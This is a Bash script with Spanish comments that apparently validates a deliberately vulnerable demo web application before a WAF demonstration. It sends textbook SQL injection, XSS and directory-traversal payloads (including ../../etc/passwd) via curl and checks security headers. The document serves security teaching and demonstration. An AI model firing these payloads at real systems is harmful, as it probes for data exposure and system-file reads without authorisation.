#!/bin/bash

# ========================================
# SCRIPT DE VALIDACIÓN DE VULNERABILIDADES
# ========================================
# Este script valida que las vulnerabilidades estén funcionando
# para la demostración SIN WAF

set -e

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Función para imprimir con colores
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Verificar que se proporcione la URL
if [ $# -eq 0 ]; then
    print_error "Uso: $0 <URL_DE_LA_APLICACION>"
    print_error "Ejemplo: $0 http://150.136.123.45"
    exit 1
fi

APP_URL=$1
print_status "Validando vulnerabilidades en: $APP_URL"

# Función para hacer requests HTTP
make_request() {
    local url="$1"
    local description="$2"
    
    print_status "Probando: $description"
    response=$(curl -s -w "%{http_code}" "$url")
    http_code="${response: -3}"
    body="${response%???}"
    
    echo "HTTP Code: $http_code"
    echo "Response: $body"
    echo "---"
}

# Test 1: Verificar que la aplicación responde
print_status "=== TEST 1: Verificar conectividad ==="
if curl -s -o /dev/null -w "%{http_code}" "$APP_URL" | grep -q "200"; then
    print_success "✅ Aplicación responde correctamente"
else
    print_error "❌ La aplicación no responde"
    exit 1
fi

# Test 2: SQL Injection
print_status "=== TEST 2: SQL Injection ==="
make_request "$APP_URL/?demo=sql&user_id=1" "Consulta normal"
make_request "$APP_URL/?demo=sql&user_id=1'" "SQL Injection básico"
make_request "$APP_URL/?demo=sql&user_id=1' OR '1'='1" "SQL Injection bypass"

# Test 3: Cross-Site Scripting (XSS)
print_status "=== TEST 3: Cross-Site Scripting (XSS) ==="
make_request "$APP_URL/?demo=xss&comment=Hola mundo" "Comentario normal"
make_request "$APP_URL/?demo=xss&comment=<script>alert('XSS')</script>" "XSS básico"
make_request "$APP_URL/?demo=xss&comment=<img src=x onerror=alert(1)>" "XSS con img"

# Test 4: Directory Traversal
print_status "=== TEST 4: Directory Traversal ==="
make_request "$APP_URL/?demo=path&file=test.txt" "Archivo normal"
make_request "$APP_URL/?demo=path&file=../../etc/passwd" "Directory traversal"
make_request "$APP_URL/?demo=path&file=../../../etc/hosts" "Directory traversal profundo"

# Test 5: Verificar headers de seguridad
print_status "=== TEST 5: Headers de Seguridad ==="
headers=$(curl -I "$APP_URL" 2>/dev/null)
echo "Headers HTTP:"
echo "$headers" | grep -E "(X-Frame|X-XSS|Content-Security|Strict-Transport)" || echo "❌ No se encontraron headers de seguridad"

# Test 6: Verificar tecnologías expuestas
print_status "=== TEST 6: Tecnologías Expuestas ==="
tech_info=$(curl -s "$APP_URL" | grep -i "powered\|server\|version\|php\|apache" | head -3)
if [ -n "$tech_info" ]; then
    print_warning "⚠️ Tecnologías expuestas:"
    echo "$tech_info"
else
    print_success "✅ No se detectaron tecnologías expuestas"
fi

print_status "=== RESUMEN DE VALIDACIÓN ==="
print_success "✅ Validación completada"
print_status "La aplicación está lista para la demostración de vulnerabilidades"
print_status "URL para la demo: $APP_URL" 